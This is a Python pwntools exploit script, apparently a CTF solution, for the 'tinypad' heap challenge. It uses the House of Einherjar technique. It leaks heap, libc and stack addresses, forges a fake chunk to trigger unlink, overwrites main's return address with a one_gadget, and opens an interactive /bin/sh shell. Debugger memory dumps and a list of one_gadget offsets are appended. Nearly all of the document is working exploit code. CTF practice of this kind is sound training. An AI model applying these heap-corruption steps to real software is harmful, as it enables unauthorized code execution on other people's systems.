#!/usr/bin/env python
# coding=utf-8
# author: thinkycx
# date: 2018-10-31
from pwn import *
context.local(arch='amd64', os='linux')


def add(size, content):
    io.recvuntil('(CMD)>>> ')
    io.sendline('a')
    io.recvuntil('(SIZE)>>> ')
    io.sendline(str(size))
    io.recvuntil('(CONTENT)>>> ')
    io.sendline(content)


def edit(idx, content):
    io.recvuntil('(CMD)>>> ')
    io.sendline('e')
    io.recvuntil('(INDEX)>>> ')
    io.sendline(str(idx))
    io.recvuntil('(CONTENT)>>> ')
    io.sendline(content)
    content = io.recvuntil('Is it OK?\n')
    io.sendline('Y')


def editclear(idx, content1, content2):
    io.recvuntil('(CMD)>>> ')
    io.sendline('e')
    io.recvuntil('(INDEX)>>> ')
    io.sendline(str(idx))
    io.recvuntil('(CONTENT)>>> ')
    io.sendline(content1)
    io.recvuntil('Is it OK?\n')
    io.sendline('N')

    io.recvuntil('(CONTENT)>>> ')
    io.sendline(content2)
    content = io.recvuntil('Is it OK?\n')
    io.sendline('Y')



    # for i in xrange(0x10,1,-1):
    #     io.recvuntil('(CONTENT)>>> ')
    #     tmp = content + "a"*i
    #     io.sendline(tmp)
    #     content = io.recvuntil('Is it OK?\n')
    #     io.sendline('N')





def delete(idx):
    io.recvuntil('(CMD)>>> ')
    io.sendline('d')
    io.recvuntil('(INDEX)>>> ')
    io.sendline(str(idx))


def leak():
    add(0x88, "1"*0x88) # 1
    add(0x38, "2"*0x38) # 1 2 
    add(0x100, "3"*0x92) # 1 2 3
    add(0x40, "4"*0x2f) # 1 2 3 4

    delete(3) # main_arena+0x88  # 1 2 [] 4
    delete(1) # heap+0xb0        # [] 2 [] 4

    io.recvuntil("INDEX: 1\x0a # CONTENT: ")
    logo = "\x0a\x0a\x0a+---"
    leak_heap = io.recvuntil(logo).split(logo)[0]
    heap_base = u64(leak_heap.ljust(8,"\x00")) - 0xc0 # leak_addr to 8 bytes and decode to int
    log.success("heap_base %#x", heap_base)

    io.recvuntil("INDEX: 3\x0a # CONTENT: ")
    logo = "\x0a\x0a\x0a+---"
    leak_libc = io.recvuntil(logo).split(logo)[0]
    libc.address = u64(leak_libc.ljust(8,"\x00"))  - 0x3c4b78 # main_arena offset, fail: libc.symbols['main_arena'] # leak_addr to 8 bytes and decode to int
    log.success("lib.address %#x", libc.address)

    add(0x100, "thinkycx") # 3 2 [] 4 FIFO
    add(0x88, "thinkycx") # 3 2 1 4

    offset = heap_base + 0xc0 - elf.symbols['tinypad']
    log.info("fake_prev_size %#x", offset)

    return offset

def houseofEinherjar(offset):
    '''
    strcpy heap data -> tinypad.buffer
    while:
            readuntil(tinypad.buffer, len(heap data), '\n')
    strcpy tinypad.buffer -> heap data
    '''
    delete(1)
    delete(3)
    delete(4)
    add(0x100, 0x90*"a")
    add(0x88, 0x88*"a")
    add(0x100, 0x90*"d")

    padding = 0x30*"a"
    fake_prev_size = offset - 0x30

    log.info("start to write fake_prev_size and 0x90!!!")
    fake_chunk_payload1 = 'b'*0x39# + p64(fake_prev_size) + "\x90"
    tmp = fake_chunk_payload1
    fake_chunk_payload1 = tmp[0:0x30] + p64(fake_prev_size).replace("\x00", 'z') + "\x10\x01"  + "z"
    log.info("fake_chunk_payload1 %s" % fake_chunk_payload1)
    edit(2, fake_chunk_payload1)

    # fake_chunk_payload1 = 'a'*0x29# + p64(fake_prev_size) + "\x90"
    # one_byte_add = p64(fake_prev_size) + "\x90"
    for i in range(1, 9):
        if i==2: continue
        if i==3: continue
        if i>=12-len( p64(fake_prev_size).replace("\x00","") ): break
        tmp = fake_chunk_payload1[:-i] # + one_byte_add[::-1][i-1]
        edit(2, tmp)  # write prev_size , strcpy cannot copy '\0'
    

    fake_chunk = elf.symbols['tinypad'] + 0x30
    fake_chunk_payload2 = padding +  p64(0x0) + p64(0x100 | 0x1 ) + p64(fake_chunk)*2 #+ \
           # p64(fake_prev_size) + p64(0x90) 
    # fake_chunk_payload2 = fake_chunk_payload2[:-1]
    fake_chunk_payload2 = fake_chunk_payload2.ljust(0x100,"\x00")# + p64(0x90)

    editclear(4, "b"*0x100 , fake_chunk_payload2)
    # edit(2, fake_chunk_payload2)
    log.info("start to unlink")
    delete(1) # unlink
    log.info("start to fix size")
    main_arena = libc.address +0x3c4b78
    fake_chunk_payload2 = padding +  p64(0x0) + p64(0x100 | 0x1 ) + p64(main_arena)*2 #+ \
    # gdb.attach(io,'break getcmd')
    edit(3, fake_chunk_payload2)

    # get environ success

    fake_chunk = elf.symbols['tinypad'] + 0x30
    one_gadget = libc.address + 0x45216 
    # payload = 0x60*"b" + p64(0x100) + p64(libc.symbols['__free_hook']) 
    log.info("environ : %#x" % libc.symbols['__environ'])

    payload = 0xc0*"b" + p64(0xf0) + p64(fake_chunk)+  p64(0x100) + p64(libc.symbols['__environ'] ) + p64(0x100) + p64(0x603158)
    add(0xf8, payload)
    # add(0x100, "a"*0x100) # 3
    # delete(2)
    # add(0x100, payload)


    io.recvuntil("INDEX: 2\x0a # CONTENT: ")
    logo = "\x0a\x0a\x0a+---"
    leak_stack = io.recvuntil(logo).split(logo)[0]
    main_return = u64(leak_stack.ljust(8,"\x00")) - (0xe5e8-0xe4f8)
    log.info("main_return: %#x" % main_return)


    # fake_chunk_payload2 = padding +  p64(0x0) + p64(0x100 | 0x1 ) + p64(main_arena)*2 #+ \
    # edit(4, fake_chunk_payload2)
    log.info("write main_return ")
    # edit(3, "1"*0xf0 + p64(0x80) + p64(main_return) )
    edit(3, p64(main_return))

    # 
    # delete(2)
    # payload = 0xa0*"b" + p64(0x100) + p64(main_return) 
    # add(0x100, payload)
    # add(0xf8, payload)
    # delete(4)
    # add(0x100, "a"*0x100)
    # edit(4, payload)
    log.info("write onegadget!!!")
    edit(2, p64(one_gadget))
    log.info("write  done!!")
    io.sendlineafter("(CMD)>>> ", "Q")

    
def getshell():
    pass



def pwn(io):
    fake_prev_size = leak()
    houseofEinherjar(fake_prev_size)
    getshell()



if __name__ == '__main__':
    global io, elf, libc, debug
    local, debug = 1, 1
    context.log_level = 'debug'
    filename = './tinypad'
    elf = ELF(filename)
    if local:
        # socat tcp-l:10002,fork exec:./filename
        io = process(filename)
        # io = process(filename, env={"LD_PRELOAD":"./libc-2.19.so.so-8674307c6c294e2f710def8c57925a50e60ee69e"})
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        context.terminal = ['tmux', 'splitw', '-h' ]
    else:
        io = remote("ip",10001)
    pwn(io)
    io.interactive()


'''
pwndbg> x/50gx 0x604000
0x604000:       0x0000000000000000      0x0000000000000091
0x604010:       0x00000000006040c0      0x00007ffff7dd1b78
0x604020:       0x0000000000000000      0x0000000000000000
0x604030:       0x0000000000000000      0x0000000000000000
0x604040:       0x0000000000000000      0x0000000000000000
0x604050:       0x0000000000000000      0x0000000000000000
0x604060:       0x0000000000000000      0x0000000000000000
0x604070:       0x0000000000000000      0x0000000000000000
0x604080:       0x0000000000000000      0x0000000000000000
0x604090:       0x0000000000000090      0x0000000000000030
0x6040a0:       0x7863796b6e696874      0x0000000000000000
0x6040b0:       0x0000000000000000      0x0000000000000000
0x6040c0:       0x0000000000000000      0x0000000000000091
0x6040d0:       0x00007ffff7dd1b78      0x0000000000604000
0x6040e0:       0x0000000000000000      0x0000000000000000
0x6040f0:       0x0000000000000000      0x0000000000000000
0x604100:       0x0000000000000000      0x0000000000000000
0x604110:       0x0000000000000000      0x0000000000000000
0x604120:       0x0000000000000000      0x0000000000000000
0x604130:       0x0000000000000000      0x0000000000000000
0x604140:       0x0000000000000000      0x0000000000000000
0x604150:       0x0000000000000090      0x0000000000000020
0x604160:       0x7863796b6e696874      0x0000000000000000
0x604170:       0x0000000000000000      0x0000000000020e91
0x604180:       0x0000000000000000      0x0000000000000000

pwndbg> x/42gx 0x603040
0x603040 <tinypad>:     0x0000000000000000      0x0000000000000000
0x603050 <tinypad+16>:  0x0000000000000000      0x0000000000000000
0x603060 <tinypad+32>:  0x0000000000000000      0x0000000000000000
0x603070 <tinypad+48>:  0x0000000000000000      0x0000000000000000
0x603080 <tinypad+64>:  0x0000000000000000      0x0000000000000000
0x603090 <tinypad+80>:  0x0000000000000000      0x0000000000000000
0x6030a0 <tinypad+96>:  0x0000000000000000      0x0000000000000000
0x6030b0 <tinypad+112>: 0x0000000000000000      0x0000000000000000
0x6030c0 <tinypad+128>: 0x0000000000000000      0x0000000000000000
0x6030d0 <tinypad+144>: 0x0000000000000000      0x0000000000000000
0x6030e0 <tinypad+160>: 0x0000000000000000      0x0000000000000000
0x6030f0 <tinypad+176>: 0x0000000000000000      0x0000000000000000
0x603100 <tinypad+192>: 0x0000000000000000      0x0000000000000000
0x603110 <tinypad+208>: 0x0000000000000000      0x0000000000000000
0x603120 <tinypad+224>: 0x0000000000000000      0x0000000000000000
0x603130 <tinypad+240>: 0x0000000000000000      0x0000000000000000
0x603140 <tinypad+256>: 0x0000000000000000      0x0000000000604010
0x603150 <tinypad+272>: 0x0000000000000028      0x00000000006040a0
0x603160 <tinypad+288>: 0x0000000000000000      0x00000000006040d0
0x603170 <tinypad+304>: 0x0000000000000018      0x0000000000604160

'''

'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
